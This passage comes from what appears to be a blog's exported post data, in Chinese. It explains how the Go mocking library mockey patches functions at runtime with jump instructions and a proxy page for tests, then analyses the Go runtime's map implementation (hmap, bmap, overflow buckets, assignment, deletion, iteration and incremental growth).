结构，所以可以通过一种链式的调用来达成初始化的目的，这个链式调用最终会以 MockBuilder.Build 方法为终结，当这个方法被调用时，整个 patch 就开始生效了。 正因为如此，Mock 函数本身非常简单，它仅仅接受 target 函数，也就是需要被 patch 的函数作为参数，在内部通过 tool.AssertFunc(target) 来断言这个入参是否为函数，然后将其赋值给 MockBuilder.target 后就返回了。 有了 target 函数，还需要一个 hook 函数，这个函数就是 target 被 patch 后会执行的东西。MockBuilder 提供了两个方法来设置 hook 函数，分别是 MockBuilder.To 和 MockBuilder.Return，这两个函数都在一开始断言了 hook 字段是否为 nil，因为如果不为 nil，那么就说明当前的 MockBuilder 是被二次利用的，这样就会出现问题。具体而言，同修改变量一样，mockey 希望每个 Mocker 结构能唯一对应一个 target 函数，而 MockBuilder.Build 方法每次都会返回一个新的 Mocker 结构，复用 MockBuilder 意味着会有两次 Build 方法的调用，此时就产生了两个 Mocker。正确的方法应该是复用第一次 Build 产生的 Mocker，因为它完全有能力完成 repatch 等操作。 回过来继续看 hook 的赋值，首先来看 MockBuilder.Return，它实际上是 MockBuilder.setReturn 方法的包装方法，语义上代表在 patch 阶段让 target 函数固定返回 MockBuilder.Return 的入参。这个方法首先调用 tool.CheckReturnType 这个工具函数来判断入参是否和 target 函数的返回值类型相匹配，比如 target 的签名是 func() (int, int, int)，入参就必须是三个数字才行。CheckReturnType 首先判断 target 是否为函数类型，然后判断 target 的返回值数量是否与入参的数量相等，这些都通过后，CheckReturnType 会依次遍历 target 的各个返回值类型，通过 reflect.TypeOf(results[i]).ConvertibleTo(t.Out(i)) 来判断入参与返回值类型是否匹配。这里调用了 ConvertibleTo，就意味着 MockBuilder.setReturn 的入参与 target 的返回值的类型并不需要完全相同，比如 reflect.TypeOf(1).ConvertibleTo(reflect.TypeOf(1.0)) 也是成立的。当类型判断通过后，MockBuilder.setReturn 方法调用 reflect.MakeFunc 创建一个返回固定值的函数，然后将其赋值给 hook 字段。 不同于 MockBuilder.Return，MockBuilder.To 方法要更加简单些，它接受一个函数作为参数，这个函数的签名需要等同于 target 的签名，代表在 patch 阶段使用这个函数来替换 target。这个函数包装了 MockBuilder.setTo，而 setTo 并没有做太多的事情，它仅仅简单判断了入参的类型是函数类型，然后就将其赋值给了 hook 字段，并没有做函数签名的判等。 有了 target 和 hook，就可以通过 MockBuilder.Build 方法来做 patch 了，这个方法简单初始化了 Mocker 结构，然后依次调用 Mocker.buildHook 和 Mocker.Patch，再将这个 Mocker 返回。因为 Mocker.Patch 就是 patch 生效的地方，所以到此为止 MockBuilder 的使命就结束了，用户后面需要通过 Build 方法返回的 Mocker 来完成同一个函数下一次的 repatch。 让我们先跳过 Mocker.buildHook 这个方法，暂且将其理解为将 MockBuilder 中的一些字段赋值给 Mocker，从而进一步完成 Mocker 的初始化即可，对这个函数的详细分析放到后面来进行，现在先把目光聚焦在 Mocker.Patch 上。它在整体上有着与 MockerVar 差不多的逻辑，首先通过加锁判断 Mocker.isPatched 是否为 true，如果条件成立那么说明这个 Mocker 已经做过 patch，此时直接返回，避免重复对同一个函数做多次 patch 导致混乱。如果没有 patch 过，那么会调用 monkey.PatchValue 这个工具函数，这个函数会完成函数的 patch 过程，并返回一个 Patch 结构，在这之后，Mocker.Patch 通用调用 addToGlobal 工具函数，与 MockerVar 结构类似，每个 Mocker 也有一个 key，取值为 target 函数的地址。 继续深入到 monkey.PatchValue 这个函数，它首先通过各种断言确保了 target、hook、proxy 的类型是正确的（这里的 proxy 是一个签名与 hook 和 target 相同的函数的指针，它可以是 nil，因为它的函数内容是被人为构造的），只要类型检查通过，函数在执行时就不会出现问题。在这之后，它通过 common.BytesOf 工具函数取出了 target 函数的前 bufSize 字节的内容，具体而言是 64 字节，并以 []byte 的方式返回。然后，PatchValue 使用 inst.BranchInto(common.PtrAt(hook)) 生成一段跳转到 hook 函数的二进制指令，记为 hookCode，这段指令与平台相关，在我的环境会跳转到 internel/monkey/inst/inst_amd64.go 这个文件中的实现上。在这之后，调用 inst.Disassemble 在 target 函数的二进制指令中中找到一个位置，这个位置是某条指令的开始，被称为 cuttingIdx，取值要保证 [target, target+cuttingIdx] 这个区间能够容纳 hookCode 的完整指令。然后，它通过 common.AllocatePage 分配一个内存页，并在后面保证这个内存页是可读可执行的，这个内存页中保存了 [target, target+cuttingIdx] 这个区间的指令，以及跳转到 target+cuttingIdx 这个位置的指令，这个内存页会被赋值给 proxy。最后，通过 mem.WriteWithSTW(targetAddr, hookCode) 将 hookCode 覆写到 target 函数中，这里面会涉及到 Mprotect 这个系统调用的使用，因为 target 函数所在的内存原本是不可写的。 这一段写得有点绕，总结下来 monkey.PatchValue 其实产生了两个新的函数，分别是经过修改后的 target 以及一个新生成的 proxy。target 函数最开始的代码被替换成了“跳转到 hook 函数并执行”，所以当用户在 patch 后调用 target 时，会直接跳转到 hook，执行新的函数，这样就完成了原函数的替换。而 proxy 的前半段保存了 target 被覆写的代码，在其之后是“跳转到 target 函数未被覆写的部分并执行”，所以当用户执行 proxy 时，实际上相当于完整执行了一遍原来的 target。monkey.PatchValue 返回了一个 Patch 结构，内部保存了 target 的地址、proxy 的代码以及 cuttingIdx，当用户调用 Patch.Unpatch 时，Patch 会将 proxy 代码中的前 cuttingIdx 写回 target，这样 target 就恢复如初了。 proxy 的作用并不仅仅是用于恢复 target，否则根本没有必要分配一个可执行的内存页来构建一个函数，直接把 target 被覆盖前的那部分代码保存下来即可。之所以费尽心思，是因为 mockey 需要能够在 patch 生效的时期执行原来的 target，至少在效果上要保证一致，而 proxy 就能够做到这点。 具体而言，mockey 可以让 patch 按条件生效，MockBuilder 提供了 When、IncludeCurrentGoRoutine、ExcludeCurrentGoRoutine 以及 FilterGoRoutine。MockBuilder.When 的入参是一个函数，这个函数接受用户调用 target 时传递的参数作为参数，返回一个布尔值，当且仅当其值为 true 时才会调用 hook，否则走原来的 target 的逻辑。IncludeCurrentGoRoutine、ExcludeCurrentGoRoutine 和 FilterGoRoutine 都是在 goroutine 维度来判断是否做 patch，具体而言是根据当前 goroutine 的 gid 来做的，每一次 patch 只能设置一个条件，目前还不支持类似 include(goroutineA) and exclude(goroutineB) 这种逻辑。在实现上，mockey 在用户提供的 hook 的基础上包装了一层，也就是 Mocker.buildHook 这个方法做的事情，它利用 reflect.MakeFunc 创建了一个新的函数，这个函数会根据 When 和 FilterGoRoutine 的设置来分别按需调用用户提供的 hook 或 proxy，调用 hook 时就是 patch 生效的状态，调用 proxy 时就是不生效的状态。 为了方便用户感知 patch 是否生效，Mocker 有 Mocker.Times 和 Mocker.MockTimes 这两个方法，前者代表用户调用了几次 target 函数，但调用时可能走了 hook 的逻辑，也可能走了原 target 的逻辑，后者代表用户走了几次 hook 的逻辑，这两个值也都是在 Mocker.buildHook 这个方法构建出来的函数中维护的。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 golang map 源码","slug":"golang-map-src","date":"2022-12-26T14:32:34.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/12/26/golang-map-src/","link":"","permalink":"/2022/12/26/golang-map-src/","excerpt":"","text":"前言最近阅读了 runtime/map.go 中的代码，以梳理 golang 中 map 这个数据结构的原理。在使用上，map 有很多内置的语法支持，但实际上这些都是 golang 提供的语法糖，这些语法在编译时都会被编译器转换为对 runtime/map.go 或其变种的函数调用，并添加一些代码，最终完成用户需要的功能。 本文尝试分析 map.go 中的代码对 map 各种操作的支持，其他变种的操作与此类似。 基础结构golang 中 map 的核心结构有如下几个： 1234567891011121314151617181920212223242526272829303132333435363738// A header for a Go map.type hmap struct &#123; count int // map 中当前有多少个元素，len() 方法读的就是这里 flags uint8 // 当前 map 的 flag，用于标识 map 的状态，比如是否有在写入或是遍历 B uint8 // loadFactor * 2^B 是当前 map 可以容纳的元素数量 noverflow uint16 // “可能”用了多少个溢出桶 hash0 uint32 // hash 函数的种子，引入更多的随机性 buckets unsafe.Pointer // 2^B 个桶，桶也就是 bmap oldbuckets unsafe.Pointer // 保存迁移前的桶 nevacuate uintptr // 当前有多少个桶被迁移了 extra *mapextra // optional fields&#125;// mapextra holds fields that are not present on all maps.type mapextra struct &#123; // If both key and elem do not contain pointers and are inline, then we mark bucket // type as containing no pointers. This avoids scanning such maps. // However, bmap.overflow is a pointer. In order to keep overflow buckets // alive, we store pointers to all overflow buckets in hmap.extra.overflow and hmap.extra.oldoverflow. // overflow and oldoverflow are only used if key and elem do not contain pointers. // overflow contains overflow buckets for hmap.buckets. // oldoverflow contains overflow buckets for hmap.oldbuckets. // The indirection allows to store a pointer to the slice in hiter. overflow *[]*bmap oldoverflow *[]*bmap // nextOverflow holds a pointer to a free overflow bucket. nextOverflow *bmap&#125;// A bucket for a Go map.type bmap struct &#123; // 桶中元素的 hash 的高八位，加速查找，bucketCnt 当前取值为 8 tophash [bucketCnt]uint8 // 后面其实是 key*8 与 value*8，但因为编译前不知道具体类型，所以需要用指针的方式来访问&#125; 本质上讲，代码中的一个 map 变量其实是 *hmap 类型，所以如果我们把这三个结构复制到自己的代码里，然后用下面的代码就可以访问 hmap 结构中的各个字段了： 1234567mp := map[int]int&#123;&#125;for i := 0; i &lt; 10; i++ &#123; mp[i] = i&#125;mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp))fmt.Printf(\"%+v\\n\", mpPtr) 基本原理对于一个 map 而言，核心需求是能够根据一个 key 来增删改查对应的 value，这需要将 value 保存在槽（hash slot）里，在访问时先对 key 来进行 hash 计算，计算的结果会是一个数字，然后把这个数字对槽的数量取模，这样就可以获知 value 在哪个槽中。但槽的数量是有限的，尽管优秀的 hash 函数能够使计算结果尽可能分散到不同的槽中，当保存的 value 数量大于槽的总数时还是不可避免地会让多个 value 进入同一个槽中，对于这种名为“哈希冲突”的问题，常见的解法是“开放地址法”和“拉链法”。 golang 中的 map 采用了同样的思路，具体来说，map 中存在 2^B（B 是大于等于 0 的数字） 个 bmap 结构，这些 bmap 被放在一块连续的内存中，也就是一个数组，每个 bmap 中保存 8 个键值对。 给定一个 key，首先会通过 hash 函数来计算得到一个 uintptr 类型的值（在 64 位的系统上占 8 个字节），然后将这个值与 2^B - 1 做与运算，就可以得到 bmap 数组的下标。这里的与运算其实是前文取模的一种优化，因为 bmap 的数量是 2 的整数次幂，那么这个值减一就会得到一个低 B 位均为 1 的数，这时对这个数做与运算时就可以拿到 [0, 2^B) 中的一个值，而这个值的取值范围与 bmap 数组的下标范围相同。 而 bmap 中首先的 8 个字节是名为 tophash 的数组，与其内部的键值对一一对应。这个值的计算方式被定义在 tophash 函数 中，取的是 hash 函数结果的高 8 位，但由于 部分值被保留用于标识一些状态，所以需要按需绕过这些值。有了这些 tophash，就可以在读取时先对比 tophash，当且仅当 bmap 中某个 tophash 的值与入参对应的 tophash 相等时再进一步比较对应的 key 与入参的 key 是否相等，这就避免了一些复杂结构的频繁判等。 而 bmap 结构本身其实并不单单是前文贴出的代码中的样子，它除了 8 个 tophash 外还包含 8 个 key、8 个对应的 value 以及一个 bmap 的指针。在不考虑内存对齐的情况下，golang 在运行时会为每一个 bmap 分配 8 + 8*sizeof(key) + 8*sizeof(value) + sizeof(uintptr) 大小的内存，从这个算式中可以发现，sizeof(key) 和 sizeof(value) 都是仅在编译时才能确定的，所以 bmap 本身的结构中仅包含 tophash，其他三个字段都是在运行时直接通过指针来访问的。为了验证这一点，我们可以为上面的 bmap 结构按实际情况填充一些字段，然后就可以用下面的代码来访问这个 bmap 中的各个值了： 12345678910111213141516171819202122// ... 省略 hmap 和 mapextra 结构type bmap struct &#123; // bucketCnt 取值为 8 tophash [bucketCnt]uint8 // 填充具体的 keys、values 以及 ptr keys [bucketCnt]string vals [bucketCnt]string ptr *bmap&#125;func main() &#123; mp := map[string]string&#123; \"hello\": \"world\", &#125; mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp)) fmt.Println(\"len:\", mpPtr.count) bucket := (*bmap)(mpPtr.buckets) fmt.Printf(\"%+v\\n\", bucket)&#125; 如果运行上面的代码，就可以直接在 bucket 的 keys 和 vals 中看到 “hello” 和 “world”，但是并不是所有的 key 和 val 都可以直接放在 bmap 中，golang 在源码中定义了 maxKeySize 和 maxElemSize，当 key 或 val 的大小大于这个值时，就会只在 bmap 中保存对应的指针，这样就避免了 bmap 过大的问题。 那么这个 ptr，就是是结尾的 bmap 指针是用来做什么的呢？这是用来链接溢出桶（overflow bucket）的。具体而言，golang 中的 map 是采用“拉链法”来解决 hash 冲突的，而这里的 ptr 是用来实现拉链的。如前所述，一个 bmap 只能保存 8 个键值对，而且这 8 个键值对 hash(key) &amp; (2^B - 1) 的值是相等的（也就是当前 bmap 的下标）。那么如果此时有一个 bmap，它内部已经拥有了 8 个键值对，而新增的第 9 个 key 算出的下标和这个已有 8 个键值对的 bmap 下标相同，就需要在这个 bmap 后面添加新的 bmap 结构才能将这个键值对保存下来。此时原有的 bmap 中的 ptr 就会指向这个新的 bmap 结构。 所以，hmap.buckets 其实可以看作是一个二维的 bmap 数组，第一维的下标通过哈希函数加与运算的方式来获取，而第二维则是一个链表，链表中所有 key 的 hash(key) &amp; (2^B - 1) 的值都是相同的。在读写 bmap 时，首先计算出第一维的下标，然后遍历这个下标对应的链表，在链表的某个节点上做具体的增删改查。 虽然拉链法能够在存储上解决哈希冲突的问题，但任由拉链越来越长会严重影响 map 的访问效率，极端情况下会退化成一条链表（写入的所有 key 计算出的下标都相同）。而之所以会造成这个问题，本质在于 bmap 的数量会限制 hash 函数的值范围（因为会对数量取模），较小的值范围会让更多的 hash(key) 落在同一个桶中。所以就需要在 map 中保存的值达到一定数量时对 map 做扩容，通过增加 bmap 的数量来为 hash 函数提供更大的值范围。那么怎样确定这个数量呢？是通过 overLoadFactor 函数 来确定的，具体而言，当 hmap.count 大于一个 bmap 中能保存的数量时，需要判断 hmap.count / 2^B 是否大于 6.5，这里的 6.5 被称为负载因子（load factor），当比值大于这个值时，overLoadFactor 返回 true，此时就需要进行扩容（其实扩容的条件不止负载因子这一个，详细的内容放在下面的小节中）。 扩容的操作就是创建一个新的 bmap 数组，这个数组要在数学意义上更适应当前键值对的数量，然后把键值对从旧的 bmap 数组中迁移到新的数组中。不难想到，当 map 中的键值对数量很多时，这个操作会非常耗性能。所以 golang 的 map 采用了“渐进式扩容”的方式，将扩容操作分摊到每一次的写入和删除操作中，每次只迁移一部分的数据。这样解决了全量扩容带来的瞬间性能问题，但却引入了迁移中间态，也就是在某些时间点，map 有一部分数据在新的 bmap 数组，有一部分还留在旧的数组中，所以在读写时就需要兼容这一点，具体的方式在下面的内容中会讨论到。 总结而言，golang 中的 map 用 hmap 来保存多个 bmap，而具体的键值对被保存在 bmap 中，每个 bmap 对应 hash 函数的一个结果，当某个 bmap 中的键值对满了但需要在这个 bmap 中新增键值对时，会通过“拉链法”在 bmap 之后链接一个新的 bmap 结构。而为了保证 map 的访问效率，还需要适时对 map 进行渐进式的扩容。 那么下面我们就来通过源码了解一下各个操作的具体逻辑。 初始化golang 中可以通过字面量或 make 方法来创建一个 map，但字面量的初始化方式会被转换为 make 与循环赋值的方式，所以最终的初始化还是由 make 来做的。另一方面，如果 map 可以分配在栈上且其容量小于 8 时，编译器会直接创建一个 hmap 的结构并为其赋初值。 当代码中使用 make 来创建 map 时，最终会调用 runtime.makemap 函数 或其变种，我们这里仅分析 makemap 函数。由于 map 的本质是一个 hmap 的指针，所以 makemap 函数的最终目的就是创建一个 hmap 结构并按需为其填充字段。其中 hmap.hash0 通过 fastrand 函数来初始化，这个值会作为后面 hash 函数的一部分来为其引入更多的随机性。紧随其后的是对 hmap.B 的初始化，通过循环调用 overLoadFactor 函数 来找到一个最小能容纳 hint 个元素的 B 值，然后将其赋值给 hmap.B 字段。 根据 overLoadFactor 的定义可以得知，如果 hint 小于等于 bucketCnt（也就是 8），那么 B 就会取为 0，此时并不会创建 bmap 结构，而是等第一次赋值时才进行初始化。与之相对的，如果 hmap.B 不为 0，那么就会调用 makeBucketArray 函数 来创建 bmap 数组，这个函数返回数组的首地址以及可能存在的溢出桶地址。 具体来看 makeBucketArray 函数中的逻辑，首先通过 bucketShift(b) 计算出 hmap.B 代表的 bmap 的数量，然后将这个值分别赋值给 base 和 nbuckets 变量，此时两个变量的值相等。然后判断 hmap.B 的值，如果大于等于 4，那么认为后面会使用溢出桶的概率比较高，此时会为 nbuckets 增加 2^(hmap.B-4) ，由于 nbuckets 才是最终创建的 bmap 数组的长度，所以此时创建的 bmap 的数量是大于所需数量的，多出来的这部分就作为未来会使用的溢出桶。 也就是说，最终创建的 bmap 数组中会有 nbuckets 个元素，其中前 2^B 个元素是正常的 bmap，而后 nbuckets - 2^B 个元素是作为溢出桶的 bmap。为了方便访问溢出桶，就需要记录一下溢出桶的位置，这也就是 makeBucketArray 函数的第二个返回值。如果 bmap 数组中存在溢出桶，那么 nbuckets 和 base 变量就不再相等，其中 base 的值就是正常 bmap 的数量，也就是 2^B。所以在 makeBucketArray 的 最后 判断了两个变量是否相等，如果不相等，那么算出第一个溢出桶的地址，将这个地址赋值给 hmap.extra 并返回给调用者。同时，会通过 bmap.setoverflow 函数 将 bmap 中最后一个溢出桶的 ptr 指向第一个 bmap，而由于创建 bmap 数组时是申请了对应大小的内存并填充 0 在里面，所以整个 bmap 数组中除最后一个溢出桶外的所有 bmap.ptr 都是 nil，这就把最后一个溢出桶与其他的 bmap 结构区分开了，这个区分的作用留到后面的小节来讨论。 此外，我们前面提到，bmap.tophash 中有一些值被用作了保留项，可以看到 0 对应的含义 是“这个槽是空的且后面没有更多的数据了”，而由于 bmap 内部在初始化时所有的字节都是 0，所以就在初始化时直接达成了这个保留项的目的。 写入golang 中对 map 进行写入时的代码类似于 map[key] = val，这个语句在编译时会被替换成对 runtime.mapassign 函数 的调用，这个函数接收 key 的指针并返回 val 的地址，拿到地址后通过编译器加入的赋值语句完成对 map 中字段的赋值。 首先，golang 中的 map 是不支持并发读写的，这一点在代码里也做了一定的保证，具体来说，hmap.flags 字段中的各个位记录了 map 的各种状态，其中右边数第三位被称为 hashWriting，在写入和删除操作中会通过异或的方式 设置这个标记位，并在结束后 取消这个标记位。如果在写入和读取时发现这个标记位已经被设置，那么就会直接 panic。为了复现这一点也很简单，只要创建两个 goroutine 对同一个 map 做读写即可。 然后，mapassign 函数会通过 hasher 函数计算入参的 key 对应的哈希值，如前所述，这个值是 uintptr 类型。 紧接着是判断 hmap.buckets 字段是否为 nil，在前面讨论 makemap 的逻辑中曾提到，如果创建时传递的大小不超过 bucketCnt，那么 hmap.B 的值为 0，此时并不会创建 hmap.buckets 结构，直到第一次对其赋值，也就是调用 mapassign 时才会做延迟创建，从 mapassign 的代码中也印证了这一点。 如果不考虑扩容的逻辑，那么 mapassign 的核心逻辑其实和前面讨论基本原理时提到的一样，会用 hash 函数结果的低位作为 bmap 的下标，高八位作为 tophash 来查找 bmap，如果一个 bmap 中找不到且有溢出桶，那么到溢出桶里继续寻找，如果找不到，那么就是新增的 key，此时要在 bmap 中新增一个键值对并增加 hmap.count 结构，如果能找到，那么就是要修改的 key，此时返回对应的 value 的地址，然后由编译器插入的语句来完成值的更新。这样看来，键值对在 bmap 中是顺序写入的，所以如果在读取时遇到了 emptyRest，也就是 0 这个特殊值，那么就可以认为这个 bmap 之后不会有数据了，此时就可以直接停止遍历。 遍历溢出桶的方式很简单，其实和遍历链表的逻辑相同，只要一直找到 hmap.ptr 为 nil 即可。但新增溢出桶则麻烦一些，如果当前 bmap 链表已经满了，但是需要在这个链表中增加新的键值对时，就需要分配一个新的溢出桶并放在链表的尾部，在代码中这是通过 hmap.newoverflow 函数 来 实现 的。 这个函数会判断 hmap.extra 是否为 nil，前面分析 map 初始化时我们曾讨论过，如果提前分配了溢出桶，那么这个字段就不会为 nil，此时判断 hmap.extra.nextOverflow 字段，这个值会作为指针指向下一个可用的溢出桶，如果这个值不为 nil，那么其指向的 bmap 就可以直接返回给调用者，否则说明没有更多的溢出桶，需要新申请一块内存并返回。 当有可用的溢出桶时，还要进一步判断 hmap.extra.nextOverflow.overflow() 是否为 nil，前面讨论 map 初始化时我们提到过，最后一个溢出桶的这个值不是 nil，所以如果这个 overflow 函数返回了非 nil，那么就说明当前调用返回的 bmap 就是最后一个溢出桶了。 几经曲折拿到一个可用的 bmap 结构后，需要调用 hmap.incrnoverflow 函数 来增加 hmap.noverflow，从代码中可以发现这个增加并非是准确的，当 hmap.B &gt;= 16 时会采样自增，但是这没有什么问题，因为这个值其实只用来判断是否需要扩容，而采样自增还是全量自增对这个判断的影响不大。 在 newoverflow 函数的最后，这个新获得的 bmap 会被链接在入参的 bmap 之后，这个入参是当前 bmap 链表的最后一个元素，经过这个链接后，新获取的 bmap 会取而代之成为最后一个元素。 读取golang 中对 map 的读取有两种方式，分别是 val := map[key] 和 val, ok := map[key]，其中后者除了返回 val 或零值外还会返回一个 bool 值用于标识 map 内部是否存在这个 key。这两种访问方式会被编译器分别转换为对 runtime.mapaccess1 函数 与 runtime.mapaccess2 函数 的调用，粗略扫一下这两个函数的代码可以发现，它们的结构其实是相同的，不同点在于后者会返回 bool 值表示 key 是否存在，不清楚为什么 mapaccess1 没有通过直接调用 mapaccess2 来实现。 这里仅分析 mapaccess2 的代码，首先判断 hmap.count 是否为 0，如果为 0，那么不需要计算 hash 也不需要遍历 bmap 就可以知道内部一定不存在 key。而如果 hmap.count 不为 0，则继续判断 hmap.flags 的 hashWriting 标记位是否被设置过，正如前面讨论写入时曾提到过，如果这个标记位被设置，那么当前 map 正在被某个 goroutine 进行写操作。回过来，如果 hashWriting 被设置了，那么直接 panic 退出。 后面的逻辑与写入时的 mapassign 差不多，先根据 hash 函数结果的低位判断 bmap 的下标，然后用高八位做 tophash，遍历该下标下的 bmap 链表，遍历的过程中先比较 tophash，如果相等则进一步判断 key 是否相等，当 key 也相等时就取出对应 value 的地址并返回。此外，前面讨论 map 的写入时我们曾提到，键值对在 bmap 中是顺序写入的，所以如果在读取中 遇到了 emptyRest，那么就可以直接停止遍历，直接返回没有这个键值对。 删除golang 中从 map 中删除某个 key 的方式是 delete(map, key)，这个函数不会返回任何内容，如果被删除的 key 不在对应的 map 里也不会有什么问题。在实现上，delete 函数会被编译器转换为对 runtime.mapdelete 函数 的调用，从函数的签名上也可以看到，该函数不会返回任何内容，这与 delete 的行为一致。 mapdelete 首先会判断 hmap.count 字段，如果其为 0，那么直接退出流程，因为此时不会有任何 key 会被删除。然后，mapdelete 会判断 hmap.flags 的 hashWriting 标记位，因为删除也是一种写操作。再之后的流程就和写入与读取相同，遍历 hmap.buckets 中的 bmap 结构尝试找到待删除的键值对，如果找到则将对应的 key 和 value 的内存清零，然后将对应的 tophash 设置为 emptyOne，这个标记与 emptyRest 不同，它仅仅表示当前的 tophash 以及对应的键值对是可以写入的，而 emptyRest 同时还表示这个 tophash 及之后都没有键值对了。 如果一个键值对被删除，那么它的 tophash 会被设置为 emptyOne，但如果被删除的是最后一个键值对，即在这个键值对之后没有其他的数据了，那么就需要将它的 tophash 设置为 emptyRest，这个值的含义在上面已经讨论过了。而一旦有 tophash 被设置为 emptyRest，就需要进一步判断相邻的前一个 tophash 是否是 emptyOne，如果有则将前面的相邻的所有 emptyOne 都设置为 emptyRest。mapdelete 中用一个 for 循环 来做这件事，它不断地向前处理 emptyOne，当前 bmap 处理结束后就去处理链表中的前一个 bmap，直到没有 emptyOne。这样才能维持 emptyRest 的语义，保证读写时的效率。 处理完 tophash 后，就需要将 hmap.count 减小一位，然后在 map 中没有元素，即 hmap.count 为 0 时重置 hmap.hash0，使下一次的同一个 key 算出来的 hash 和上次不同，进一步提高了 map 的随机性。最后，mapdelete 再次判断 hmap.flags 的 hashWriting，如果没有并发读写问题，就将其清零。 通读 mapdelete 后我们可以发现，它并没有 bmap 的清理逻辑，即便一个溢出桶中所有的 tophash 都是 emptyRest，这个 bmap 也不会被清理掉。虽然这使得 bmap 链表的长度没有随着删除而减少，但这其实并不怎么影响读写的效率，因为 emptyRest 可以让 bmap 链表的遍历提前终止，而 mapdelete 维护了 emptyRest 的语义。另一方面，不清理 bmap 使得后续再写入溢出桶时不需要再分配新的内存，这进一步提高了写操作的效率。但过长的 bmap 链表是内存不友好的，所以 map 引入了新的机制来保证溢出桶的数量不会太多，这个机制就是扩容操作，我们在后面的小节会进行讨论。 遍历这里的遍历指的就是 for-range 操作，具体来说，是 for key, val := range map、 for key := range map以及 for range map。这些操作会被编译器展开为类似如下的代码： 123456hit := hiter&#123;&#125;mapiterinit(maptype, hmap, &amp;hit)for ; hit.key != nil; mapiternext(&amp;hit) &#123; key := *hit.key val := *hit.val&#125; 上面代码中 for 循环内部的 key 和 val 是与 for-range 等式左边的变量一一对应的，所以如果只有 key 的话那么 for 循环内部也只有 key，没有变量时情况与此类似。 继续分析上面生成的代码，核心在于 hiter 类型以及 mapiterinit 函数 与 mapiternext 函数，先看一下 hiter 类型的定义，这里给出各个字段的注释，在两个功能函数中会用到它们： 1234567891011121314151617type hiter struct &#123; key unsafe.Pointer // 本次循环中获取到的 key，如果为 nil 那么结束遍历 elem unsafe.Pointer // 本次循环中获取到的 val，如果为 nil 那么结束遍历 t *maptype // 内部有当前 map 的类型信息，由于 mapiternext 没有像 mapiterinit 一样接收这个参数，所以需要将它保存到 hiter 中直接被 mapiternext 使用 h *hmap // 被遍历的 map，保存在这里的作用同 t 字段 buckets unsafe.Pointer // 调用 mapiterinit 时的 hmap.buckets bptr *bmap // 调用 mapiternext 时需要被遍历的 bmap，包括溢出桶 overflow *[]*bmap // 调用 mapiterinit 时的 hmap.extra.overflow oldoverflow *[]*bmap // 调用 mapiterinit 时的 hmap.extra.oldoverflow startBucket uintptr // 被选为第一个遍历的 bmap，是一个下标 offset uint8 // 遍历 bmap 时从第几个键值对开始 wrapped bool // 是否已经遍历了一圈，当遍历的 bmap 回到 startBucket 时，如果 wrapped 为 true 那么结束遍历 B uint8 // 调用 mapiterinit 时的 hmap.B i uint8 // 调用 mapiternext 时需要被遍历的 bmap 中键值对的下标，会与 offset 字段配合 bucket uintptr // 调用 mapiternext 时需要被遍历的下一个 bmap 链表的下标 checkBucket uintptr // 与扩容有关&#125; 然后继续看上面的 for 循环，为了保证第一次循环时 hit 中已经有 key 和 val 了，可以猜测 mapiterinit 内部或者直接对 key 和 val 进行了赋值，或者调用了 mapiterinit，从代码中可以看到是 后者。下面就一一分析一下这两个函数。 首先来看 mapiterinit，在函数的开始判断了 hmap.count 是否为 0，如果为 0 那么直接 return，此时 hiter 的 key 和 elem 字段都是 nil，回到上面被编译器生成的代码中，可以发现如果 key 为 nil，那么整个 for-range 就会结束。 然后，mapiterinit 会根据入参来填充 hiter 中的各个字段，其中 startBucket 和 offset 是随机选择的，这两个字段用于指引 mapiternext 从哪里开始遍历键值对，正是因为在这里引入了随机性，所以每次遍历同一个 map 得到的键值对顺序都可能是不同的。反过来说，如果把 startBucket 和 offset 都设置成 0，然后构建一个长度为 8 的 map，那么每次遍历拿到的键值对序列都会相同。 在 mapiterinit 的最后会给 hmap.flags 设置 iterator 和 oldIterator 两个标记位，然后进一步调用 mapiternext，尝试填充 key 和 elem 两个字段，第一次调用 mapiternext 时，一定会拿到一对不为 nil 的键值对。 map 的 for-range 也被认为是一种读操作，所以 mapiternext 的一开始就判断了 hmap.flags 的 hashWriting 标记位，如果这个标记位被设置过，那么表示存在并发读写，此时会直接 panic。然后 mapiternext 就开始遍历这个 map，每次找到一个键值对后就将上下文保存在 hiter 中方便下一次 mapiternext 被调用时来使用这些信息，然后将这次找到的键值对赋值到 hiter 上，这样编译器生成的代码就可以直接从 hiter.key 和 hiter.elem 中获取所需的内容。 在遍历的过程中，hiter.bptr 记录了正在遍历的 bmap，这个 bmap 从第 hiter.offset 个键值对开始，检查所有的键值对后判断是否有溢出桶，如果有的话将 hiter.bptr 指向溢出桶，那么下次调用 mapiternext 时就会从新的 bmap 中遍历返回键值对，新的 bmap 也是从第 hiter.offset 个键值对开始的。在 mapiternext 中不能通过检查 tophash 是否为 emptyRest 来决定是否直接结束遍历，因为 hiter.offset 很可能使最开始遍历的 tophash 不是第一个，所以即便遇到了 emptyRest，也要至少把当前这个 bmap 遍历完才可以。 而 hiter.wrapped 则记录了 bmap 数组中的最后一个 bmap 是否被遍历过，所以如果当前需要遍历的 bmap 数组的下标是 hiter.startBucket，并且 hiter.wrapped 为 true 的话，那么就可以判断所有的键值对都被遍历过，此时直接将 hiter.key 和 hiter.elem 赋值为 nil，这样编译器生成的代码就会命中 for 循环的结束条件，从而结束整个循环过程。 虽然 for-range 的过程结束了，但不论是 mapiterinit 还是 mapiternext 都没有清理 hmap.flags 中的 iterator 和 oldIterator 标记位，事实上，这两个标记的清理是在扩容阶段做的。 扩容扩容的目的有两个，第一是在保存的键值对数量大于一定量时，哈希冲突的问题会变得频繁，此时需要增加 bmap 的数量来扩大哈希函数的取值范围；第二是当溢出桶太多时，需要重新设置键值对在 bmap 中的布局，让它们排列得更紧凑，这样一方面减少溢出桶的数量从二降低内存压力，一方面能加速遍历 bmap 链表，因为 emptyOne 在重排列后会消失。这两个扩容策略分别对应代码中的 overLoadFactor 函数 和 tooManyOverflowBuckets 函数。 正如前面在基本原理中讨论的，map 的扩容是渐进式的，会被分摊到各次的写操作中，且因为引入了“扩容中”的状态，所以读操作也要对它做一些兼容。 扩容操作的触发点在 mapassign 函数中，如前所述，就是对 map 进行赋值时，更具体来说是向 map 中增加新的键值对时。hmap.growing 函数 是一个谓词函数，通过判断 hmap.oldbuckets 是否为 nil 来获知当前的 map 是否在扩容中，如果没有在扩容，且新增一个 key 后不满足负载因子的条件或有太多的溢出桶，那么就会调用 hashGrow 函数 进行扩容，扩容后会用 goto again 重新执行 mapassign 